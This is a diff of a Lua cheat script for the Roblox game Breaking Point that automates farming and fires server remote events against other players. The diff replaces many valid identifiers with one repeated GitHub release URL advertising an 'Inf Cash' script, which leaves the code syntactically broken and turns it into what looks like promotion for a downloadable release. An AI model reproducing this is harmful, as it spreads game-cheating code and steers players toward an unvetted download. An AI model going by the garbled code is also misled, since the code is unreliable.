@@ -1,10 +1,10 @@
-game:GetService("Players").LocalPlayer.Idled:connect(function()
-game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0(function()
+game:GetService("VirtualUser"):ClickButton2(https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0())
 end)
 
-if game.PlaceId == 648362523 then
+if https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0 == 648362523 then
     repeat wait() until game:IsLoaded()
-    game.StarterGui:SetCore(
+    https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0(
         "SendNotification",
         {
             Title = "Breaking Point AutoFarm Credits",
@@ -14,19 +14,19 @@ if game.PlaceId == 648362523 then
     
     
     
-    Clone = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:Clone()
-    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:Destroy()
-    Clone.Parent = game:GetService("Players").LocalPlayer.Character
-    game.Players.LocalPlayer.settings["Display Gun"].Value = true
-    game.Players.LocalPlayer.CharacterAdded:Connect(
+    Clone = game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0()
+    game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0()
+    https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0 = game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0
+    https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0["Display Gun"].Value = true
+    https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0(
         function()
             if getgenv().AutoFarm then
                 pcall(function()
-                game.Players.LocalPlayer.settings["Display Gun"].Value = true
+                https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0["Display Gun"].Value = true
                 wait(4)
-                Clone = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:Clone()
-                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:Destroy()
-                Clone.Parent = game:GetService("Players").LocalPlayer.Character
+                Clone = game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0()
+                game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0()
+                https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0 = game:GetService("Players")https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0
                 end)
             end
         end
@@ -37,8 +37,8 @@ if game.PlaceId == 648362523 then
         game:GetService("ReplicatedStorage").RemoteEvent:FireServer(16, "public")
         end)
         wait()
-        for i, v in pairs(game.Players:GetPlayers()) do
-            if v.Name == game.Players.LocalPlayer.Name then
+        for i, v in pairs(https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0()) do
+            if https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0 == https://github.com/KevinYTx/Breaking-Point-Script---Inf-Cash/releases/tag/v2.0 then
             else
                 pcall(function()
                 game:GetService("ReplicatedStorage").RemoteEvent:FireServer(30, v)
